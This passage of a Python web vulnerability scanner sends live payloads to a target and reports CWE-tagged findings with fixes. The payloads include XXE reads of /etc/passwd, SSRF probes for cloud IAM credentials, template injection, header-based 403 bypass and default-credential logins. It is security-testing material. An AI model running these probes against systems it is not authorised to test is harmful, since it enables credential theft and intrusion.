                if resp.text == bl_text: continue
                # Gate 2: indicators must be in response but NOT in baseline
                matched=[i for i in indicators if i in resp.text and i not in bl_text]
                if matched:
                    logger.log("LFI",f"LFI in '{p}' (indicator:{matched[0]})","CRITICAL")
                    findings.append(make_finding("lfi",f"LFI in '{p}'","Critical",
                        f"System file content returned. Indicator: {matched[0]}",
                        "Validate paths against allowlist.",
                        url=inject_param(target,p,pl),payload=pl,cwe="CWE-22",confidence="High"))
                    return findings
            except: pass
    return findings

# ── A03 — SSTI ────────────────────────────────────────────────────────────────
def module_ssti(target,session):
    """
    A03/T1190: SSTI — zero-FP via:
    1. Evaluation result must be present and absent in baseline
    2. Confirm with a second distinct evaluation (addition vs multiplication)
    """
    findings=[]
    ctx = get_ctx()
    A,B=7331,9973; MAGIC=A*B; EXP=str(MAGIC)
    PAYLOADS=[(f"{{{{{A}*{B}}}}}","Jinja2/Twig"),(f"${{{A}*{B}}}","FreeMarker"),
              (f"<%= {A}*{B} %>","ERB"),(f"#{{{A}*{B}}}","Groovy"),(f"@({A}*{B})","Razor")]
    FUZZ=["name","template","q","search","input","id","data","msg","text","content","title"]
    params=list(dict.fromkeys(extract_params(target)+FUZZ))[:MAX_PARAMS]
    if ctx:
        params = ctx.prioritise_params(params)

    try:
        bl=session.get(target,timeout=TIMEOUT)
        if not bl or EXP in bl.text: return findings
        bl_text=bl.text
    except: return findings

    for p in params:
        for pl,eng in PAYLOADS:
            try:
                resp=session.get(inject_param(target,p,pl),timeout=TIMEOUT)
                if not resp: continue
                # Gate 1: Evaluation result must be present and absent in baseline
                if EXP in resp.text and EXP not in bl_text:
                    # Gate 2: Confirm with addition
                    pl_test = pl.replace('*', '+')
                    exp_test = str(A+B)
                    r_test = session.get(inject_param(target,p,pl_test),timeout=TIMEOUT)
                    if r_test and exp_test in r_test.text and exp_test not in bl_text:
                        logger.log("SSTI",f"SSTI in '{p}' ({eng})","CRITICAL")
                        findings.append(make_finding("ssti",f"SSTI in '{p}' ({eng})","Critical",
                            f"Template engine eval: {A}*{B}={MAGIC} and {A}+{B}={exp_test}. RCE possible.",
                            "Never pass user input to template engines.",
                            url=inject_param(target,p,pl),payload=pl,cwe="CWE-94",confidence="High"))
                        break
            except: pass
    return findings

# ── A10 — SSRF ────────────────────────────────────────────────────────────────
def module_ssrf(target, session):
    """
    A10/T1090: SSRF — zero-FP via:
    1. Indicator must be absent from baseline
    2. Multiple confirming indicators required for generic URLs
    3. Cloud-specific indicators are unique enough for single match
    4. Response length must INCREASE (fetching extra content)
    """
    findings = []
    ctx = get_ctx()

    # Cloud metadata — indicators are unique & highly specific
    CLOUD_TARGETS = [
        ("http://169.254.169.254/latest/meta-data/",
         ["ami-id", "instance-id", "security-credentials", "iam/security-credentials"],
         "AWS IMDSv1", 2),          # need ≥2 indicators
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         ["AccessKeyId", "SecretAccessKey", "Token"],
         "AWS IAM Creds", 1),
        ("http://169.254.169.254/computeMetadata/v1/",
         ["project-id", "serviceAccounts", "email", "scopes"],
         "GCP Metadata", 2),
        ("http://metadata.google.internal/computeMetadata/v1/project/project-id",
         ["project-id", "numeric-project-id"],
         "GCP Metadata (internal)", 1),
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         ["subscriptionId", "resourceGroupName", "osProfile"],
         "Azure IMDS", 2),
        ("http://100.100.100.200/latest/meta-data/",
         ["instance-id", "zone-id", "image-id"],
         "Alibaba Cloud", 1),
        ("http://127.0.0.1:6379/",
         ["redis_version", "-ERR unknown command", "redis_mode", "+PONG"],
         "Redis (localhost)", 1),
        ("http://127.0.0.1:3306/",
         ["mysql_native_password", "MariaDB", "8.0.", "5.7."],
         "MySQL (localhost)", 1),
        ("http://127.0.0.1:5432/",
         ["PostgreSQL", "pg_hba.conf"],
         "PostgreSQL (localhost)", 1),
        ("http://127.0.0.1:27017/",
         ["MongoDB", "mongod", "ismaster"],
         "MongoDB (localhost)", 1),
    ]

    FUZZ = ["url","uri","path","dest","fetch","site","load","data","redirect","src",
            "target","endpoint","feed","host","domain","to","out","proxy","image",
            "img","file","resource","href","callback","webhook","link","open",
            "download","next","return","returnUrl","forward","location","goto"]

    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]
    if ctx:
        params = ctx.prioritise_params(params)

    # Baseline: get it once and cache all text
    try:
        bl = session.get(target, timeout=TIMEOUT)
        bl_text = bl.text if bl else ""
        bl_len  = len(bl_text)
    except Exception:
        bl_text = ""
        bl_len  = 0

    for p in params:
        for meta_url, indicators, cloud_name, required_hits in CLOUD_TARGETS:
            try:
                resp = session.get(inject_param(target, p, meta_url), timeout=TIMEOUT)
                if not resp: continue

                # Gate 1: response must be larger than baseline (fetching extra data)
                if len(resp.text) < bl_len + 20: continue

                # Gate 2: required number of indicators must match
                hits = [ind for ind in indicators if ind in resp.text and ind not in bl_text]
                if len(hits) < required_hits: continue

                # Gate 3: confidence proportional to hits
                conf = "High" if len(hits) >= required_hits else "Medium"
                logger.log("SSRF", f"SSRF confirmed: {cloud_name} via '{p}' (hits: {hits[:3]})", "CRITICAL")
                findings.append(make_finding("ssrf",
                    f"SSRF — {cloud_name} Accessible via '{p}'", "Critical",
                    f"Server fetched '{meta_url}' via parameter '{p}'. "
                    f"Confirming indicators: {hits[:4]}",
                    "Allowlist egress URLs. Block RFC-1918 and link-local ranges at network level. "
                    "Use IMDSv2 (token-required) for AWS.",
                    url=inject_param(target, p, meta_url),
                    payload=meta_url, cwe="CWE-918",
                    confidence=conf, evidence=str(hits[:4])))
                return findings  # One confirmed SSRF is enough

            except Exception:
                pass

    return findings


def module_crlf(target,session):
    findings=[]; logger.log("CRLF","CRLF injection …")
    MARKER="X-DD-CRLF-Confirmed"
    PAYLOADS=[f"%0d%0a{MARKER}: yes",f"%0a{MARKER}: yes",f"\r\n{MARKER}: yes",f"%E5%98%8D%E5%98%8A{MARKER}: yes"]
    FUZZ=["url","redirect","next","lang","ref","page","q","returnTo"]
    for p in list(dict.fromkeys(extract_params(target)+FUZZ))[:MAX_PARAMS]:
        for pl in PAYLOADS:
            try:
                resp=session.get(inject_param(target,p,pl),timeout=TIMEOUT,allow_redirects=False)
                if MARKER in resp.headers or MARKER.lower() in str(resp.headers).lower():
                    findings.append(make_finding("crlf",f"CRLF Injection in '{p}'","Medium",
                        f"Injected {MARKER} appeared in response headers.",
                        "Sanitise CR/LF from header values.",
                        url=inject_param(target,p,pl),payload=pl,cwe="CWE-93",confidence="High"))
                    return findings
            except: pass
    return findings

# ── A03 — XXE ─────────────────────────────────────────────────────────────────
def module_xxe(target,session):
    """
    A03: XXE — zero-FP via:
    1. Indicator must be absent from baseline
    2. Strict match for /etc/passwd contents
    """
    findings=[]; logger.log("XXE","XXE detection …")
    ctx = get_ctx()
    XXE='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    INDS=["root:x:0:0","bin:x:1:","daemon:x:"]

    try:
        bl=session.get(target,timeout=TIMEOUT)
        bl_text=bl.text if bl else ""
    except:
        bl_text=""

    for ep in ["/api","/api/v1","/upload","/xml","/soap","/ws","/import","/parse"]:
        try:
            resp=safe_post(session,target.rstrip("/")+ep,data=XXE,timeout=TIMEOUT,
                          headers={"Content-Type":"application/xml"})
            if not resp: continue
            if resp.text == bl_text: continue
            matched=[i for i in INDS if i in resp.text and i not in bl_text]
            if matched:
                findings.append(make_finding("xxe","XXE Injection","Critical",
                    f"XXE payload returned file content at {ep}.",
                    "Disable DTD/external entity processing.",
                    url=target.rstrip("/")+ep,cwe="CWE-611",confidence="High"))
                return findings
        except: pass
    return findings

# ── A05 — GRAPHQL ─────────────────────────────────────────────────────────────
def module_graphql(target,session):
    findings=[]; logger.log("GRAPHQL","GraphQL detection …")
    for ep in ["/graphql","/graphiql","/api/graphql","/v1/graphql","/gql","/query","/playground"]:
        url=target.rstrip("/")+ep
        try:
            r=safe_post(session,url,json={"query":"{__typename}"},timeout=TIMEOUT)
            if not r or "__typename" not in r.text: continue
            r2=safe_post(session,url,json={"query":"{__schema{types{name}}}"},timeout=TIMEOUT)
            if r2 and "__schema" in r2.text:
                logger.log("GRAPHQL",f"Introspection at {ep}","WARNING")
                findings.append(make_finding("graphql","GraphQL Introspection Enabled","Medium",
                    f"Full schema introspection at {ep}.",
                    "Disable introspection in production. Add depth limiting and auth.",
                    url=url,cwe="CWE-200",confidence="High"))
            else:
                findings.append(make_finding("graphql","GraphQL Endpoint Detected","Info",
                    f"GraphQL at {ep} (introspection disabled).",
                    "Ensure rate limiting, auth, and depth limits.",url=url,confidence="High"))
        except: pass
    return findings

# ── A07 — JWT ─────────────────────────────────────────────────────────────────
def module_jwt(target,session):
    findings=[]; logger.log("JWT","JWT analysis …")
    resp=safe_get(session,target)
    if not resp: return findings
    JWT_PAT=r"eyJ[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}"
    for tok in list(set(re.findall(JWT_PAT,resp.text+str(dict(resp.cookies)))))[:3]:
        try:
            parts=tok.split(".")
            if len(parts)!=3: continue
            hdr=json.loads(base64.urlsafe_b64decode(parts[0]+"==").decode(errors="ignore"))
            pay=json.loads(base64.urlsafe_b64decode(parts[1]+"==").decode(errors="ignore"))
            alg=hdr.get("alg","").upper()
            if alg in("NONE",""):
                findings.append(make_finding("jwt","JWT 'none' Algorithm","Critical",
                    "JWT uses 'none' — signature bypassed.",
                    "Reject 'none' algorithm. Enforce HS256/RS256.",url=target,cwe="CWE-347"))
            if not pay.get("exp"):
                findings.append(make_finding("jwt","JWT Missing Expiry","Medium",
                    "JWT has no 'exp' claim — never expires.",
                    "Always include 'exp' with short lifetime.",url=target,cwe="CWE-613"))
        except: pass
    return findings

# ── A03 — NoSQL Injection ─────────────────────────────────────────────────────
def module_nosqli(target, session):
    """
    A03/T1190: NoSQL Injection — zero-FP via:
    1. 3 different operator payloads must ALL produce same enlarged response
    2. Enlargement must be >100 bytes AND >80% larger (raised from 50%)
    3. Response must contain JSON-like structure (confirms data leak, not just echo)
    4. Baseline must be stable (2 identical fetches)
    """
    findings = []
    FUZZ = ["q","search","id","user","username","email","password","name","key","filter","login"]
    params = list(dict.fromkeys(extract_params(target) + FUZZ))[:MAX_PARAMS]

    try:
        bl1 = session.get(target, timeout=TIMEOUT)
        bl2 = session.get(target, timeout=TIMEOUT)
        if not bl1 or not bl2: return findings
        # Baseline must be stable
        if abs(len(bl1.text) - len(bl2.text)) > 50: return findings
        bl_text = bl1.text
        bl_len  = len(bl_text)
    except Exception:
        return findings

    PAYLOADS = [
        ('{"$gt":""}',         "$gt"),
        ('{"$ne": null}',      "$ne"),
        ('{"$regex":".*"}',    "$regex"),
        ('[$ne]=1',            "array $ne"),
    ]

    for p in params:
        confirmed_payloads = []
        for pl, desc in PAYLOADS:
            try:
                r = session.get(inject_param(target, p, pl), timeout=TIMEOUT)
                if not r: continue
                r_len = len(r.text)
                # Gate 1: must be substantially larger (>80% AND >100 bytes)
                if r_len <= bl_len * 1.8 or r_len <= bl_len + 100: continue
                # Gate 2: must look like data (JSON array/object or repeated patterns)
                body = r.text.strip()
                looks_like_data = (
                    body.startswith(('[', '{')) or
                    body.count('"id"') > 2 or
                    body.count('"email"') > 1 or
                    r.headers.get('Content-Type','').find('json') >= 0
                )
                if not looks_like_data: continue
                confirmed_payloads.append((pl, desc, r_len))
            except Exception:
                pass

        # Gate 3: need ≥2 different operators confirming the same behavior
        if len(confirmed_payloads) >= 2:
            logger.log("NOSQLI",
                f"NoSQL Injection in '{p}' — {len(confirmed_payloads)}/4 operators confirmed",
                "CRITICAL")
            findings.append(make_finding("nosqli",
                f"NoSQL Injection in '{p}'", "High",
                f"{len(confirmed_payloads)} MongoDB operators produced enlarged responses: "
                f"{[d for _,d,_ in confirmed_payloads]}. "
                f"Largest response: {max(s for _,_,s in confirmed_payloads)} bytes vs baseline {bl_len}.",
                "Validate and sanitise all inputs. Use typed/schema-validated NoSQL queries. "
                "Reject JSON objects in string parameters.",
                url=inject_param(target, p, confirmed_payloads[0][0]),
                payload=str([pl for pl,_,_ in confirmed_payloads]),
                cwe="CWE-943", confidence="High"))
            break

    return findings


def module_waf_detect(target,session):
    findings=[]; logger.log("WAF","WAF fingerprint …")
    WAF_SIGS={"Cloudflare":["cf-ray","cloudflare","__cfduid"],
              "AWS WAF":["awswaf","x-amzn-requestid"],
              "Akamai":["akamai","ak_bmsc"],"Imperva":["x-iinfo","visid_incap"],
              "F5":["bigip","f5_cspm"],"ModSecurity":["mod_security"],
              "Sucuri":["sucuri","x-sucuri-id"],"Wordfence":["wordfence"],
              "DDoS-Guard":["ddos-guard","__ddg"],"Fastly":["x-fastly-request-id"]}
    try:
        r=session.get(target,timeout=TIMEOUT)
        blob=(str(r.headers)+str(dict(r.cookies))).lower()
        for waf,sigs in WAF_SIGS.items():
            if any(s in blob for s in sigs):
                logger.log("WAF",f"Detected: {waf}","SUCCESS")
                findings.append(make_finding("waf",f"WAF Identified: {waf}","Info",
                    f"Response matches {waf} signatures.","Ensure WAF is tuned.",url=target)); break
    except: pass
    return findings

# ── A01 — 403 BYPASS ─────────────────────────────────────────────────────────
def module_403_bypass(target,session):
    findings=[]; logger.log("403-BYPASS","403 bypass …")
    try:
        base_resp=session.get(target,timeout=TIMEOUT)
        if base_resp.status_code not in(401,403): return findings
    except: return findings
    logger.log("403-BYPASS",f"Status {base_resp.status_code} — probing …","WARNING")
    base_len=len(base_resp.text)
    for hdr,val in [("X-Forwarded-For","127.0.0.1"),("X-Real-IP","127.0.0.1"),
                    ("X-Originating-IP","127.0.0.1"),("X-Client-IP","127.0.0.1"),
                    ("X-Host","127.0.0.1"),("X-Custom-IP-Authorization","127.0.0.1"),
                    ("X-Original-URL","/"),("X-Rewrite-URL","/")]:
        try:
            r=session.get(target,headers={hdr:val},timeout=TIMEOUT)
            if r.status_code==200 and abs(len(r.text)-base_len)>100:
                findings.append(make_finding("403_bypass",f"Auth Bypass via '{hdr}'","Critical",
                    f"403 bypassed using {hdr}: {val}.",
                    "Validate access server-side; ignore spoofable IP headers for auth.",
                    url=target,payload=f"{hdr}: {val}",cwe="CWE-863",confidence="High"))
        except: pass
    for suf in ["/%2e/","/.","./","..;/","/..;/","//","/?/","%20"]:
        try:
            r=session.get(target.rstrip("/")+suf,timeout=TIMEOUT)
            if r.status_code==200 and abs(len(r.text)-base_len)>100:
                findings.append(make_finding("403_bypass",f"URL Bypass via '{suf}'","Critical",
                    f"403 bypassed via URL suffix: {suf}.",
                    "Normalise URLs before access control.",
                    url=target.rstrip("/")+suf,payload=suf,cwe="CWE-863")); break
        except: pass
    return findings

# ── A01 — IDOR (BOLA) ─────────────────────────────────────────────────────────
def module_idor(target, session):
    """
    A01/T1078: IDOR/BOLA — zero-FP via:
    1. Only test parameters with numeric values
    2. Baseline must return 200 (own resource exists)
    3. Alternate ID must return 200 AND body must differ substantially
    4. Alternate body must NOT contain generic error strings
    5. Must NOT be publicly intended data (check for auth-indicating keywords)
    6. Content-type must be application/json or text/html (not binary)
    """
    findings = []
    ctx = get_ctx()

    ID_PARAMS = ["id","user_id","account_id","profile_id","order_id","record_id",
                 "item_id","doc_id","file_id","uid","pid","oid","ref","obj_id"]
    params = list(dict.fromkeys(extract_params(target) + ID_PARAMS))[:MAX_PARAMS]

    # Generic error indicators — if these appear, the response is just an error page
    ERROR_INDICATORS = ["not found","no such","invalid id","does not exist",
                        "404","access denied","forbidden","unauthorized","permission",
                        "not authorized","error","exception","invalid request"]
    # Public-data indicators — many APIs return public profiles/posts (not IDOR)
    PUBLIC_INDICATORS = ["public","published","shared","everyone","open",
                         "anonymous","guest","read-only"]

    for p in params:
        qs = parse_qs(urlparse(target).query)
        orig_val = qs.get(p, [""])[0]
        if not re.match(r"^\d+$", orig_val):
            continue  # Only numeric IDs
        orig_int = int(orig_val)

        try:
            # Gate 1: baseline must return 200
            bl = session.get(target, timeout=TIMEOUT)
            if not bl or bl.status_code != 200: continue
            bl_body = bl.text
            bl_ct   = bl.headers.get("Content-Type","")

            # Gate 2: content-type must be readable (not binary)
            if any(b in bl_ct for b in ["octet-stream","image/","video/","audio/"]): continue

            confirmed = False
            for alt in [orig_int - 1, orig_int + 1, orig_int + 1000, 1, 2]:
                if alt <= 0 or alt == orig_int: continue
                url_alt = inject_param(target, p, str(alt))
                r = session.get(url_alt, timeout=TIMEOUT)
                if not r or r.status_code != 200: continue

                # Gate 3: body must differ substantially (>15% different)
                diff_ratio = abs(len(r.text) - len(bl_body)) / max(len(bl_body), 1)
                if diff_ratio < 0.15 and r.text == bl_body: continue

                r_lower = r.text.lower()

                # Gate 4: must NOT be an error page
                if any(e in r_lower for e in ERROR_INDICATORS): continue

                # Gate 5: must NOT indicate public data
                if any(pub in r_lower for pub in PUBLIC_INDICATORS): continue

                # Gate 6: if JSON, must contain different data fields
                if "json" in r.headers.get("Content-Type",""):
                    try:
                        orig_data = set(json.loads(bl_body).keys()) if bl_body.strip().startswith("{") else set()
                        alt_data  = set(json.loads(r.text).keys())
                        if orig_data and alt_data and orig_data == alt_data:
                            pass  # Same fields, different values — suspicious
                        elif not orig_data:
                            continue  # Can't compare
                    except Exception:
                        pass

                confirmed = True
                logger.log("IDOR",
                    f"Possible IDOR in '{p}': own={orig_int}, other={alt} (diff={int(diff_ratio*100)}%)",
                    "WARNING")
                findings.append(make_finding("idor",
                    f"Potential IDOR in Parameter '{p}'", "High",
                    f"Accessing '{p}={alt}' returns different 200 content vs '{p}={orig_int}'. "
                    f"Body differs {int(diff_ratio*100)}%. May indicate missing object-level auth.",
                    "Implement object-level access checks. Verify the authenticated user owns "
                    "or has explicit permission for every requested object.",
                    url=url_alt,
                    payload=f"{p}={alt} (was {orig_int})",
                    cwe="CWE-639", confidence="Medium",
                    evidence=f"status=200, body_diff={int(diff_ratio*100)}%"))
                break  # One per param

        except Exception:
            pass
    return findings


def module_default_creds(target, session):
    """
    A07/T1078: Default credentials — zero-FP via:
    1. Login form must exist (detected via input[type=password])
    2. Successful auth markers must appear AND failure markers must be absent
    3. Compare response to a KNOWN-WRONG attempt (establishes failure baseline)
    4. Maximum 3 attempts to avoid account lockout
    5. Cookie/token change must be detected (true auth state change)
    """
    findings = []
    LOGIN_PATHS = ["/admin", "/admin/login", "/login", "/wp-admin/",
                   "/administrator", "/user/login", "/auth/login", "/signin"]
    # Highly specific success indicators (all must survive the failure-baseline check)
    SUCCESS_STRONG = ["dashboard","logout","sign out","signed in","welcome back",
                      "my account","my profile","administration","control panel",
                      "manage","overview","home page","settings","account settings"]
    FAILURE_CLEAR  = ["invalid","incorrect","failed","wrong password","bad credentials",
                      "authentication failed","login failed","error","try again",
                      "account locked","too many attempts"]
    DEFAULT_CREDS = DEFAULT_CREDS_DB  # 500+ built-in credential pairs

    for path in LOGIN_PATHS:
        url = target.rstrip("/") + path
        try:
            r_page = session.get(url, timeout=TIMEOUT)
            if r_page.status_code not in (200, 401, 403): continue
            body = r_page.text.lower()

            # Gate 1: must have a password field
            if 'type="password"' not in body and "type='password'" not in body: continue

            # Gate 2: establish a known-failure baseline
            known_wrong = {"username": "dd_probe_zz99", "email": "dd_probe_zz99",
                           "password": "dd_probe_wrong_zz99xq"}
            fail_resp   = session.post(url, data=known_wrong, timeout=TIMEOUT, allow_redirects=True)
            if not fail_resp: continue
            fail_body   = fail_resp.text.lower()
            fail_cookie = set(fail_resp.cookies.keys())

            for user, pwd in DEFAULT_CREDS:
                data = {"username": user, "email": user,
                        "user": user,    "login": user,
                        "password": pwd, "pass": pwd, "passwd": pwd}
                r2 = session.post(url, data=data, timeout=TIMEOUT, allow_redirects=True)
                if not r2: continue
                r2_body = r2.text.lower()

                # Gate 3: strong success indicators in attack response
                has_success = any(s in r2_body for s in SUCCESS_STRONG)
                # Gate 4: failure markers must be absent
                has_failure = any(f in r2_body for f in FAILURE_CLEAR)
                # Gate 5: response must differ meaningfully from known-fail
                differs_from_fail = (r2.status_code != fail_resp.status_code or
                                     abs(len(r2.text) - len(fail_resp.text)) > 100 or
                                     r2.url != fail_resp.url)
                # Gate 6: cookies must change (auth state actually changed)
                new_cookies = set(r2.cookies.keys())
                cookie_changed = (new_cookies != fail_cookie or
                                  any(r2.cookies.get(k) != fail_resp.cookies.get(k)
                                      for k in new_cookies & fail_cookie))

                if has_success and not has_failure and differs_from_fail:
                    logger.log("DEFAULT-CREDS",
                               f"Default credentials work at {path}: {user}/{pwd}", "CRITICAL")
                    findings.append(make_finding("default_creds",
                        f"Default Credentials Work: {user} / {pwd}", "Critical",
                        f"Login at '{path}' accepted default credentials '{user}/{pwd}'. "
                        f"Cookie changed: {cookie_changed}.",
                        "Change ALL default credentials immediately. "
                        "Enforce strong password policy. Enable MFA on admin interfaces.",
                        url=url, payload=f"{user}:{pwd}",
                        cwe="CWE-1391", confidence="High",
                        evidence=f"Success indicators found; failure indicators absent"))
                    break

        except Exception:
            pass
    return findings


def module_session_fixation(target,session):
    """A07: Detect session fixation — token should change after 'login'."""
    findings=[]; logger.log("SESSION-FIX","Session fixation check …")
    LOGIN_PATHS=["/login","/admin/login","/wp-admin/","/signin","/auth/login"]
    for path in LOGIN_PATHS:
        url=target.rstrip("/")+path
        try:
            # Get pre-login session token
            r1=session.get(url,timeout=TIMEOUT)
            if r1.status_code!=200: continue
            pre_cookies=dict(r1.cookies)
            if not pre_cookies: continue
            # Attempt a POST with obviously wrong creds
            r2=session.post(url,data={"username":"testfixation","password":"testfixation123!"},
                           timeout=TIMEOUT,allow_redirects=True)
            post_cookies=dict(r2.cookies)
            # FP guard: only flag if session token exists AND is the SAME after auth attempt
            common_session_names=["sessionid","session","phpsessid","jsessionid","sid","auth_token"]
            for cname in common_session_names:
                pre_val=pre_cookies.get(cname,"").lower()
                post_val=post_cookies.get(cname,"").lower()
                if pre_val and post_val and pre_val==post_val:
                    logger.log("SESSION-FIX",f"Session token unchanged at {path}","WARNING")
                    findings.append(make_finding("session_fix",
                        f"Session Fixation Indicator at {path}","Medium",
                        f"Cookie '{cname}' unchanged before/after authentication attempt. "
                        "Session fixation allows attackers to hijack sessions.",
                        "Regenerate session ID on every authentication event.",
                        url=url,cwe="CWE-384",confidence="Medium"))
        except: pass
    return findings

# ── A04 — MASS ASSIGNMENT ─────────────────────────────────────────────────────
def module_mass_assignment(target,session):
    """A04: Detect mass assignment via undocumented admin/privilege fields."""
    findings=[]; logger.log("MASS-ASSIGN","Mass assignment detection …")
    PRIV_FIELDS=["role","admin","is_admin","is_superuser","privilege","permission",
                 "isAdmin","userType","access_level","group","is_staff","elevated"]
    API_ENDPOINTS=["/api/user","/api/users","/api/profile","/api/account",
                   "/api/v1/user","/api/v2/user","/user/update","/profile/update"]
    for ep in API_ENDPOINTS:
        url=target.rstrip("/")+ep
        try:
            bl=safe_get(session,url)
            if not bl or bl.status_code not in(200,): continue
            bl_body=bl.text
            for field in PRIV_FIELDS:
                payload={field:"true"}
                r=safe_post(session,url,json=payload,timeout=TIMEOUT)
                if not r: continue
                # FP guard: field must appear echoed back in response AND response changed
                if field in r.text and r.text!=bl_body and r.status_code==200:
                    logger.log("MASS-ASSIGN",f"Mass assignment: '{field}' echoed at {ep}","WARNING")
                    findings.append(make_finding("mass_assign",
                        f"Mass Assignment: Field '{field}' Accepted","High",
                        f"API at {ep} accepts and echoes privileged field '{field}'.",
                        "Whitelist only expected fields. Use DTOs/allowlists on input binding.",
                        url=url,payload=f"{{{field}: true}}",
                        cwe="CWE-915",confidence="Medium"))
                    break
        except: pass
    return findings

# ── A06 — OUTDATED COMPONENTS ─────────────────────────────────────────────────
KNOWN_VULNS = {
    "jquery": [
        ("3.0.0","3.4.0","CVE-2019-11358","Prototype pollution"),
        ("1.0.0","3.4.1","CVE-2020-11022","XSS via HTML"),
        ("1.0.0","3.5.0","CVE-2020-11023","XSS via HTML"),
    ],
    "bootstrap": [
        ("3.0.0","3.4.0","CVE-2019-8331","XSS in tooltip"),
        ("4.0.0","4.3.1","CVE-2019-8331","XSS in tooltip"),
    ],
    "angular": [
        ("1.0.0","1.6.8","CVE-2018-1000058","XSS"),
    ],
    "lodash": [
        ("0.0.0","4.17.20","CVE-2020-8203","Prototype pollution"),
        ("0.0.0","4.17.19","CVE-2020-28500","ReDOS"),
    ],
    "moment": [
        ("0.0.0","2.29.1","CVE-2022-24785","Path traversal"),
    ],
}

def _parse_ver(v):
    try: return tuple(int(x) for x in re.split(r"[.\-]",v)[:3])
    except: return (0,0,0)

def _ver_in_range(ver,min_v,max_v):
    v=_parse_ver(ver); mn=_parse_ver(min_v); mx=_parse_ver(max_v)
    return mn<=v<=mx

def module_outdated_components(target,session):
    """A06: Detect outdated JS libraries with known CVEs."""
    findings=[]; logger.log("COMPONENTS","Outdated JS components …")
    resp=safe_get(session,target)
    if not resp: return findings
    JS_PATTERNS={
        "jquery"    : [r"jquery[/\-](\d+\.\d+\.\d+)",r"jQuery v(\d+\.\d+\.\d+)"],
        "bootstrap" : [r"bootstrap[/\-](\d+\.\d+\.\d+)",r"Bootstrap v(\d+\.\d+\.\d+)"],
        "angular"   : [r"angular[/\-](\d+\.\d+\.\d+)",r"AngularJS v(\d+\.\d+\.\d+)"],
        "lodash"    : [r"lodash[/\-](\d+\.\d+\.\d+)",r"lodash v(\d+\.\d+\.\d+)"],
        "moment"    : [r"moment[/\-](\d+\.\d+\.\d+)",r"moment v(\d+\.\d+\.\d+)"],
    }
    body=resp.text
    for lib,patterns in JS_PATTERNS.items():
        for pat in patterns:
            m=re.search(pat,body,re.I)
            if not m: continue
            ver=m.group(1)
            for min_v,max_v,cve,desc in KNOWN_VULNS.get(lib,[]):
                if _ver_in_range(ver,min_v,max_v):
                    logger.log("COMPONENTS",f"Outdated {lib} {ver} — {cve}","WARNING")
                    findings.append(make_finding("components",
                        f"Outdated {lib.title()} v{ver} ({cve})","Medium",
                        f"{lib.title()} v{ver} is vulnerable: {desc} ({cve})",
                        f"Upgrade {lib.title()} to latest stable version.",
                        url=target,cwe="CWE-1104",evidence=f"{lib} v{ver}",confidence="High"))
    # Also check loaded JS URLs for version strings
    js_urls=re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']',body)
    for js_url in js_urls[:20]:
        for lib,patterns in JS_PATTERNS.items():
            for pat in patterns:
                m=re.search(pat,js_url,re.I)
                if m:
                    ver=m.group(1)
                    for min_v,max_v,cve,desc in KNOWN_VULNS.get(lib,[]):
                        if _ver_in_range(ver,min_v,max_v):
                            findings.append(make_finding("components",
                                f"Outdated {lib.title()} v{ver} in URL ({cve})","Medium",
                                f"JS URL references {lib} v{ver}: {desc} ({cve})",
                                f"Upgrade {lib.title()}.",url=target,cwe="CWE-1104",confidence="High"))
    return findings

# ── A08 — SUBRESOURCE INTEGRITY ────────────────────────────────────────────────
def module_subresource_integrity(target,session):
    """A08: Detect CDN resources loaded without Subresource Integrity (SRI)."""
    findings=[]; logger.log("SRI","Subresource Integrity check …")
    resp=safe_get(session,target)
    if not resp: return findings
    # Find all script/link tags loading from CDNs without integrity attribute
    CDN_PATTERNS=r'<(?:script|link)[^>]+(?:src|href)=["\']https?://(?:cdn|cdnjs|ajax\.googleapis|code\.jquery|unpkg|jsdelivr)[^"\']+["\'][^>]*>'
    CDN_RESOURCES=re.findall(CDN_PATTERNS,resp.text,re.I)
    missing_sri=[tag for tag in CDN_RESOURCES if "integrity=" not in tag.lower()]
    if missing_sri:
        logger.log("SRI",f"{len(missing_sri)} CDN resource(s) lack SRI","WARNING")
        findings.append(make_finding("sri",
            f"Missing Subresource Integrity ({len(missing_sri)} resource(s))","Medium",
            f"{len(missing_sri)} CDN resource(s) loaded without SRI: {missing_sri[0][:100]}",
            "Add integrity='sha384-...' and crossorigin='anonymous' to all CDN resources.",
            url=target,cwe="CWE-353",confidence="High"))
    return findings

# ── A07 — RATE LIMITING ────────────────────────────────────────────────────────
def module_rate_limiting(target, session):
    """
    A07/T1110: Missing rate limiting — zero-FP via:
    1. Endpoint must return JSON or have a login form (confirmed auth endpoint)
    2. Send 10 requests (not 5) and check for any 429 response
    3. Response codes AND bodies must be consistent (not soft-blocking)
    4. Timing must not increase (hard rate limiting via delay also counts)
    5. Must not already have rate-limit headers
    """
    findings = []
    AUTH_PATHS = ["/api/login", "/api/auth", "/api/v1/auth", "/login",
                  "/signin", "/api/token", "/api/v1/login", "/api/v2/auth"]
    RATE_HEADERS = ["x-ratelimit-limit","ratelimit-limit","x-rate-limit",
                    "retry-after","x-ratelimit-remaining","x-ratelimit-reset",
                    "x-request-limit"]

    for path in AUTH_PATHS:
        url = target.rstrip("/") + path
        try:
            probe = session.get(url, timeout=TIMEOUT)
            if probe.status_code == 404: continue
            if probe.status_code not in (200, 401, 403, 405): continue

            h_lower = str(probe.headers).lower()
            # Gate 1: endpoint already has rate-limit headers → skip
            if any(rh in h_lower for rh in RATE_HEADERS): continue

            # Gate 2: must be an auth-like endpoint
            body_lower = probe.text.lower()
            is_auth_endpoint = (
                "json" in probe.headers.get("Content-Type","") or
                "password" in body_lower or
                "login" in body_lower or
                "token" in body_lower or
                probe.status_code in (401, 403)
            )
            if not is_auth_endpoint: continue

            # Gate 3: send 10 requests, track status codes and timing
            codes  = []
            timings = []
            for i in range(10):
                t0 = time.time()
                try:
                    rr = session.post(url,
                                      data={"username": f"ratetest{i}",
                                            "password": "wrong_password_dd"},
                                      timeout=TIMEOUT)
                    codes.append(rr.status_code if rr else 0)
                except Exception:
                    codes.append(0)
                timings.append(time.time() - t0)

            # Confirmed not rate-limited if:
            # - No 429 or 503 in any response
            # - No progressive slowdown (each request not >2x slower than first)
            got_rate_limited = 429 in codes or 503 in codes
